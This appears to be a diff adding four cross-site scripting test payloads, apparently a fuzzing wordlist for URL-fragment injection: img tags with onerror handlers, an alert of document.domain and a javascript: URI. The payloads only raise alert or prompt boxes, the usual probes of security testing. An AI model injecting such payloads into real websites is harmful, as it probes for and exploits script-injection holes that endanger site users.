@@ -1,0 +1,4 @@
+#"><img src=xx onerror=prompt(1)>
+#alert(document.domain)
+#"><img src=:// onerror=alert(2)>
+#javascript:alert(1)//
